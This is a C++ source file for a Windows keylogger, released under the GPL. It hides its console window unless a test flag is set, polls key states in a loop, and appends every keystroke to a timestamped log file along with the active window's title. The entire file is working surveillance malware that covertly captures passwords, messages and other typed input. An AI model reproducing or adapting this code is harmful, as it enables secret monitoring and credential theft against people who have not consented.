
/*
	Keylogger
	Created @ 02.02.2009
	Copyright (C) 2009 Christian Mayer <http://fox21.at>
	
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


#include "main.h"
#include <cstdio>
#define TEST

using namespace std;

int main(int argc, char *argv[]){
	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
	puts(PROJECT_COPYRIGHT);
	puts("");
	
#ifndef TEST
	char path[260];

    GetModuleFileName(NULL,path,260);

    HWND console = FindWindow("ConsoleWindowClass",path);

    if(IsWindow(console))

    ShowWindow(console,SW_HIDE); // hides the 
#endif 
	string basepath = dirBasename(getSelfPath());
	
	time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char filename[MAX_PATH];
	char filepath[MAX_PATH];
	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
	sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
	
	//printf("filepath '%s'\n", filepath); exit(0);
	
	
	string lastTitle = "";
	ofstream klogout(filepath);
	
	//SHORT lastc = 0;
	int space;
	int lentitle;
	while(1){
		Sleep(2); // give other programs time to run
		
		// get the active windowtitle
		char title[1024],*ptitle;
		ptitle=title;
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);
		space=0;
		lentitle=strlen(title);
		for (int i = 0; i < lentitle; i++)
			if(title[i]==' ')
				space=i;
		ptitle = title+space;
		if(lastTitle != title){		
			if(lentitle == 0){
				klogout << endl << "NO_ACTIVE ";
#ifdef DEBUG
				cout << endl << "NO_ACTIVE ";
#endif
			}else{
				klogout << endl << ptitle <<" ";
#ifdef DEBUG
				cout << endl << ptitle <<" ";
#endif
			}
			lastTitle = title;
		}
		
		// logging keys, thats the keylogger
		for(unsigned char c = 1; c < 255; c++){
			SHORT rv = GetAsyncKeyState(c);
			if(rv & 1){ // on press button down
				string out = "";
				if(c == 1)
					out = "";
				else if(c == 2)
					out = "";
				else if(c == 3)
					out = "";
				else if(c == 13)
					out = "[RETURN]";
				else if(c == 16 || c == 17 || c == 18)
					out = "";
				else if(c == 160 || c == 161) // lastc == 16
					out = "[SHIFT]";
				else if(c == 162 || c == 163) // lastc == 17
					out = "[CTRL]";
				else if(c == 164) // lastc == 18
					out = "[ALT]";
				else if(c == 165)
					out = "[ALT GR]";
				else if(c == 8)
					out = "[BACKSPACE]";
				else if(c == 9)
					out = "[TAB]";
				else if(c == 27)
					out = "[ESC]";
				else if(c == 33)
					out = "[PAGE UP]";
				else if(c == 34)
					out = "[PAGE DOWN]";
				else if(c == 35)
					out = "[HOME]";
				else if(c == 36)
					out = "[POS1]";
				else if(c == 37)
					out = "[ARROW LEFT]";
				else if(c == 38)
					out = "[ARROW UP]";
				else if(c == 39)
					out = "[ARROW RIGHT]";
				else if(c == 40)
					out = "[ARROW DOWN]";
				else if(c == 45)
					out = "[INS]";
				else if(c == 46)
					out = "[DEL]";
				else if((c >= 65 && c <= 90)
					|| (c >= 48 && c <= 57)
					|| c == 32)
					out = c;
				
				else if(c == 91 || c == 92)
					out = "[WIN]";
				else if(c >= 96 && c <= 105)
					out = intToString(c - 96);
				else if(c == 106)
					out = "/";
				else if(c == 107)
					out = "+";
				else if(c == 108)
					out = "-";
				else if(c == 109)
					out = ",";
				else if(c >= 112 && c <= 123)
					out = "[F" + intToString(c - 111) + "]";
				else if(c == 144)
					out = "[NUM]";
				else if(c == 192)
					out = "[OE]";
				else if(c == 222)
					out = "[AE]";
				else if(c == 186)
					out = "[UE]";
				else if(c == 186)
					out = "+";
				else if(c == 188)
					out = ",";
				else if(c == 189)
					out = "-";
				else if(c == 190)
					out = ".";
				else if(c == 191)
					out = "#";
				else if(c == 226)
					out = "<";
				
				else
					out = "["+intToString(c)+"]";
				
#ifdef DEBUG
					cout << out;
#endif
					klogout << out;
					klogout.flush();
				
				//lastc = c;
			}
		}
		
	}
	
	klogout.close();
	
	return 0;
}
